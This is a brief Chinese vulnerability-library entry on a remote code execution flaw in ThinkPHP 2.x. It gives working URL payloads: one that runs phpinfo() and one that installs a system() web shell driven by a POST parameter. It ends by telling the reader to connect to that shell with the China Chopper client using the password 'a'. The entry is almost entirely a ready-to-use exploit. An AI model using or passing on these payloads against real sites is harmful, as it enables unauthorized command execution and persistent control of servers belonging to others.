---
title: 'Thinkphp 2.X RCE漏洞'
date: Wed, 26 Aug 2020 03:54:30 +0000
draft: false
tags: ['白阁-漏洞库']
---

### 漏洞范围

Thinkphp 2.X

### 漏洞POC

```
/index.php?s=/index/index/xxx/${@phpinfo()}
```

![](https://www.bylibrary.cn/wp-content/uploads/2020/08/GOVEV6Z1@EEJXNFNCB.png)

```
/index.php?s=/index/index/xxx/${@print(system($_POST[a]))}
```

菜刀连接,密码为a。